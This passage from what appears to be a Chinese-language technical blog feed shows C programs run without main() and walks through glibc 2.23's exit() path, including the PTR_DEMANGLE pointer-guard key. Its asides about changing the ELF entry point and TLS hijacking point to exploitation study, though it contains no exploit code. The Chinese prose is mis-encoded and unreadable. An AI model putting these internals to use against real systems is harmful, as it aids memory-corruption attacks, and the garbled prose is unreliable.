title="Compiler"></a>Compiler</h3><p>åœ¨Unix-likeæ“ä½œç³»ç»Ÿä¸­ï¼Œ<code>_start</code>ç¬¦å·è¢«ä½œä¸ºç¨‹åºå…¥å£ç‚¹çš„é»˜è®¤å€¼ã€‚</p><p>æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä¸å¯ä»¥ä¸ç”¨è¿™ä¸ªé»˜è®¤å€¼å‘¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -nostartfiles -e my_main -g -o test test.c </code></p><ul><li>-nostartfiles:Do not use the standard system startup files when linking. The standard system libraries are used normally, unless -nostdlib, -nolibc, or -nodefaultlibs is used.</li><li>-e:Specify that the program entry point is entry. The argument is interpreted by the linker; the GNU linker accepts either a symbol name or an address.</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">fish: â€œ./testâ€ terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»ˆæ­¢äº†ï¼Œæ²¡æœ‰è¾“å‡º</p><p>gdbçœ‹ä¸‹ï¼Œå‘ç°printfå‡½æ•°æ‰§è¡Œå®Œäº†ï¼Œretæ—¶ç¨‹åºè¿”å›éæ³•åœ°å€å´©æºƒï¼Œæ²¡æœ‰è¾“å‡ºæ˜¯å› ä¸ºæ²¡æœ‰åˆ·æ–°ç¼“å†²åŒº</p><p><img src="/2023/04/02/main-return/image-20230403005428232.png" alt="image-20230403005428232"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">puts</span></span><br><span class="line">fish: â€œ./testâ€ terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>æ”¹ä¸ºputsï¼Œè¾“å‡ºäº†ï¼Œå› ä¸ºputsæ˜¯è¡Œç¼“å­˜å±æ€§ï¼Œæ‰€æœ‰è¾“å‡ºäº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; objdump -d test</span><br><span class="line"></span><br><span class="line">test:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;:</span><br><span class="line">  <span class="number">400320</span>:    ff <span class="number">35</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    pushq  <span class="number">0x200ce2</span>(%rip)        # <span class="number">601008</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x8</span>&gt;</span><br><span class="line">  <span class="number">400326</span>:    ff <span class="number">25</span> e4 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce4</span>(%rip)        # <span class="number">601010</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">40032</span>c:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax)</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400330</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line">  <span class="number">400330</span>:    ff <span class="number">25</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce2</span>(%rip)        # <span class="number">601018</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x18</span>&gt;</span><br><span class="line">  <span class="number">400336</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       pushq  $<span class="number">0x0</span></span><br><span class="line">  <span class="number">40033b</span>:    e9 e0 ff ff ff       jmpq   <span class="number">400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400340</span> &lt;my_main&gt;:</span><br><span class="line">  <span class="number">400340</span>:    <span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">400341</span>:    <span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">400344</span>:    bf <span class="number">58</span> <span class="number">03</span> <span class="number">40</span> <span class="number">00</span>       mov    $<span class="number">0x400358</span>,%edi</span><br><span class="line">  <span class="number">400349</span>:    e8 e2 ff ff ff       callq  <span class="number">400330</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40034</span>e:    <span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">40034f</span>:    <span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">400350</span>:    c3                   retq   </span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹æ±‡ç¼–ä¹Ÿæ˜¯retqä¸åˆæ³•</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æˆ‘ä»¬ä¸ç”¨returnè¿”å›ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨exitç»ˆæ­¢åº”è¯¥å°±å¯ä»¥æ­£å¸¸åˆ·æ–°ç¼“å†²åŒºï¼Œå¹¶é€€å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>printfä¹Ÿè¢«åˆ·æ–°ç¼“å†²åŒºè¾“å‡ºäº†ï¼Œæ­£å¸¸é€€å‡º</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨é»˜è®¤_startå…¥å£ç‚¹å»åš</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _start() &#123;</span><br><span class="line">  <span class="type">int</span> ret = my_main();</span><br><span class="line">  <span class="built_in">exit</span>(ret); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -nostartfiles -g -o test test.c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -g -o test test.c</span><br><span class="line">test.c: In function â€˜_startâ€™:</span><br><span class="line">test.c:<span class="number">4</span>:<span class="number">13</span>: warning: implicit declaration of function â€˜my_mainâ€™ [-Wimplicit-function-declaration]</span><br><span class="line">   <span class="type">int</span> ret = my_main();</span><br><span class="line">             ^</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function!</span><br></pre></td></tr></table></figure><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>ELF Headeré‡Œçš„ <code>Elf32_Addr      e_entry;            /* ç¨‹åºå…¥å£åœ°å€ */</code>è§„å®šäº†ç¨‹åºçš„å…¥å£ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹æ‰è¿™ä¸ªå…¥å£ç‚¹æ¥åšhacking</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc exit() æºç åˆ†æ</title>
      <link href="/2023/04/02/exit/"/>
      <url>/2023/04/02/exit/</url>
      
        <content type="html"><![CDATA[<h2 id="Glibc2-23-exit-source-code-analysis"><a href="#Glibc2-23-exit-source-code-analysis" class="headerlink" title="Glibc2.23 exit() source code analysis"></a>Glibc2.23 exit() source code analysis</h2><p>æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”¨æˆ·å±‚é¢"><a href="#ç”¨æˆ·å±‚é¢" class="headerlink" title="ç”¨æˆ·å±‚é¢"></a>ç”¨æˆ·å±‚é¢</h2><p>stdlib&#x2F;exit.cä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>__exit_funcsæ˜¯ä»€ä¹ˆ?</p><p><img src="/2023/04/02/exit/image-20230402194009243.png" alt="image-20230402194009243"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span><span class="comment">//å•é“¾è¡¨</span></span><br><span class="line">    <span class="type">size_t</span> idx;<span class="comment">//è¡¨ç¤ºå·²ç»æ·»åŠ åˆ°è¯¥ç»“æ„ä½“ä¸­çš„å‡½æ•°æ•°é‡ã€‚å®ƒç”¨äºè·Ÿè¸ª fns æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªç©ºé—²ä½ç½®ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span><span class="comment">//ææ„å‡½æ•°ç»“æ„ä½“æ•°ç»„</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    flavorï¼šç”¨äºæ ‡è¯†é€€å‡ºå¤„ç†å‡½æ•°çš„ç±»å‹,åœ¨æ­¤ç»“æ„ä½“ä¸­å®šä¹‰äº†ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œè¯¥å­—æ®µåº”è¯¥æ˜¯è¯¥æšä¸¾ç±»å‹çš„æˆå‘˜ä¹‹ä¸€</span></span><br><span class="line"><span class="comment">    &#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_freeè¡¨ç¤ºæ­¤ä½ç½®ç©ºé—²</span></span><br><span class="line"><span class="comment">       - ef_usè¡¨ç¤ºæ­¤ä½ç½®è¢«ä½¿ç”¨ä¸­, ä½†æ˜¯å‡½æ•°ç±»å‹ä¸çŸ¥é“</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa åˆ†åˆ«å¯¹åº”ä¸‰ç§ä¸åŒçš„ææ„å‡½æ•°ç±»å‹, ä¸»è¦æ˜¯å‚æ•°ä¸Šçš„å·®å¼‚</span></span><br><span class="line"><span class="comment">       atï¼šä¸€ä¸ªæŒ‡å‘æ— å‚æ•°æ— è¿”å›å€¼å‡½æ•°çš„æŒ‡é’ˆï¼Œç”¨äºè¡¨ç¤ºä¸€ç§ç‰¹æ®Šçš„é€€å‡ºå¤„ç†å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸éœ€è¦ä¼ é€’ä»»ä½•å‚æ•°ï¼Œåªéœ€åœ¨ç¨‹åºé€€å‡ºæ—¶æ‰§è¡Œå³å¯ã€‚</span></span><br><span class="line"><span class="comment">       onï¼šä¸€ä¸ªå¸¦æœ‰ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°æŒ‡é’ˆï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é€€å‡ºçŠ¶æ€ç ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œç”¨äºä¼ é€’å‡½æ•°çš„å‚æ•°ã€‚</span></span><br><span class="line"><span class="comment">       cxaï¼šä¸€ä¸ªå¸¦æœ‰ä¸‰ä¸ªå‚æ•°çš„å‡½æ•°æŒ‡é’ˆï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œç”¨äºä¼ é€’å‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯é€€å‡ºçŠ¶æ€ç ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘åŠ¨æ€å…±äº«å¯¹è±¡å¥æŸ„çš„æŒ‡é’ˆã€‚</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="class"><span class="keyword">union</span>//<span class="title">union</span>ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºä¸Šé¢ä¸‰ç§ä¸åŒç±»å‹çš„ææ„å‡½æ•°</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">      &#125; on;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">        <span class="type">void</span> *dso_handle;</span><br><span class="line">      &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span>           <span class="comment">//initialå®šä¹‰åœ¨libcçš„å¯å†™å…¥æ®µä¸­</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial; <span class="comment">//exitå‡½æ•°é“¾è¡¨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="run-exit-handlers"><a href="#run-exit-handlers" class="headerlink" title="__run_exit_handlers"></a>__run_exit_handlers</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">             <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span></span><br><span class="line">        &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">      <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">          <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">          <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ef_free:</span><br><span class="line">        <span class="keyword">case</span> ef_us:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_on:</span><br><span class="line">          onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          onfct (status, f-&gt;func.on.arg);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_at:</span><br><span class="line">          atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          atfct ();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">          cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">          PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">       allocate element.  */</span></span><br><span class="line">    <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="call-tls-dtors"><a href="#call-tls-dtors" class="headerlink" title="__call_tls_dtors()"></a>__call_tls_dtors()</h4><p>stdlib&#x2F;cxa_thread_atexit_impl.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Call the destructors.  This is called either when a thread returns from the</span></span><br><span class="line"><span class="comment">   initial function or when the process exits via the exit function.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">     potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">     l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__call_tls_dtors)</span><br></pre></td></tr></table></figure><p>æ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šï¼Œå½“çº¿ç¨‹ä»è°ƒç”¨åˆå§‹å‡½æ•°è¿”å›æ—¶æˆ–è¿›ç¨‹é€šè¿‡exitå‡½æ•°é€€å‡ºæ—¶è°ƒç”¨ï¼Œé‡Šæ”¾çº¿ç¨‹å±€éƒ¨å‚¨å­˜</p><p><code>tls_dtor_list</code> æ˜¯å¤šçº¿ç¨‹ç¨‹åºä¸­çš„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ææ„å‡½æ•°åˆ—è¡¨ã€‚<code>tls_dtor_list</code> ç»´æŠ¤äº†æ‰€æœ‰éœ€è¦åœ¨çº¿ç¨‹é€€å‡ºæ—¶è¢«è°ƒç”¨çš„ææ„å‡½æ•°çš„æŒ‡é’ˆåˆ—è¡¨ã€‚è¿™ä¸ªåˆ—è¡¨ä¼šåœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åœ°è¿›è¡Œä¿®æ”¹å’Œæ›´æ–°ã€‚</p><p>æˆ‘ä»¬çš„ç¤ºä¾‹ç¨‹åºå¹¶æ²¡æœ‰ï¼Œç›´æ¥returnäº†</p><h4 id="whileå¾ªç¯"><a href="#whileå¾ªç¯" class="headerlink" title="whileå¾ªç¯"></a>whileå¾ªç¯</h4><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸æ–­éå†å»æ ¹æ®ç±»å‹ï¼Œåˆ©ç”¨å‡½æ•°æŒ‡é’ˆå»è°ƒç”¨__exit_funcsé‡Œçš„ææ„å‡½æ•°ï¼Œé‡Šæ”¾æ‰ç»“æ„ä½“å†…å­˜</p><p>ä¸è¿‡è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªè§£å¯†æ“ä½œ</p><p><img src="/2023/04/02/exit/image-20230402210547276.png" alt="image-20230402210547276"></p><p>è¿™ä¸ªå‡½æ•°åœ°å€éå¸¸æ€ªï¼Œä¸æ˜¯æ­£å¸¸å€¼</p><p>ä¼šåˆ©ç”¨PTR_DEMANGLEè¿™ä¸ªè§£å¯†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)    asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">                              pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>å¾ªç¯å³ç§»å’Œå¼‚æˆ–è§£å¯†ï¼Œå¼‚æˆ–çš„è¿™ä¸ªkeyæ¥è‡ªtcbhead_t 0x30åç§»å¤„ï¼Œä¹‹å‰tsl hijackæ—¶æ“ä½œçš„0x28å¤„çš„canary</p><p><img src="/2023/04/02/exit/image-20230402211644558.png" alt="image-20230402211644558"></p><p><img src="/2023/04/02/exit/image-20230402211610883.png" alt="image-20230402211610883"></p><p>rorå</p><p><img src="/2023/04/02/exit/image-20230402211718281.png" alt="image-20230402211718281"></p><p>xorå</p><p><img src="/2023/04/02/exit/image-20230402212201065.png" alt="image-20230402212201065"></p><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><p>_dl_finiå‡½æ•°æºç åˆ†æ</p><h3 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h3><p>__exit_funcsæ˜¯æ€ä¹ˆåˆå§‹åŒ–çš„</p><h3 id="RUN-HOOK-libc-atexit"><a href="#RUN-HOOK-libc-atexit" class="headerlink" title="RUN_HOOK (__libc_atexit, ())"></a>RUN_HOOK (__libc_atexit, ())</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text_set_element(__libc_atexit, _IO_cleanup);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="IO-flush-all-lockp-o"><a href="#IO-flush-all-lockp-o" class="headerlink" title="_IO_flush_all_lockp(o)"></a>_IO_flush_all_lockp(o)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœå®šä¹‰äº† _IO_MTSAFE_IO å®ï¼Œå°±å¼€å§‹ä¸€ä¸ªæ¸…ç†åŒºåŸŸçš„æ“ä½œï¼Œå¹¶åœ¨éœ€è¦æ—¶åŠ é” list_all_lock</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock 